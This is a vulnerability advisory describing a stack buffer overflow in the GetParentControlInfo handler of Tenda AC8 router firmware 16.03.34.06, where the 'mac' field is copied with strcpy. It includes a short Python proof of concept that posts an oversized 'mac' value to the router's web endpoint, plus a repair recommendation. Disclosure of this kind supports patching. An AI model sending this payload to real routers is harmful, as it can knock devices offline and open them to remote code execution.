# **AC8 US_AC8V4.0si_V16.03.34.06_cn_TDC01 GetParentControlInfo Buffer Overflow Vulnerability**
## **Vulnerability Description**
<img width="1895" height="875" alt="image" src="https://github.com/user-attachments/assets/c4933565-f64b-4c83-879f-ae5ab5e58fd3" />

A stack overflow vulnerability exists in the `GetParentControlInfo` function of the Tenda AC8 router firmware version 16.03.34.06 (updated 2024-11-29). Attackers can exploit this vulnerability to achieve denial of service or remote code execution attacks.

**【Download Link】**
https://www.tenda.com.cn/download/detail-3518.html

**【Update Date】**
2024-11-29

## **Analysis and Verification**

<img width="1597" height="886" alt="image" src="https://github.com/user-attachments/assets/8ee312d5-6e0a-41d8-bf58-a7ef88ed7de2" />

The vulnerability is located in the `GetParentControlInfo` function. The program reads parameters from the `mac` field and stores them into a buffer via `strcpy`. Due to the absence of length restrictions, a buffer overflow vulnerability occurs.
<img width="1333" height="225" alt="image" src="https://github.com/user-attachments/assets/5f8545a0-24ef-4e9b-a05d-a3f48d84477f" />

## **PoC**

python

```
import requests

url = "http://192.168.67.135/goform/GetParentControlInfo"
data = {
    "mac": "a" * 1000
}
res = requests.post(url=url, data=data)
print(res.content)
```



## **Repair Recommendation**

Restrict the length of characters read into the buffer.
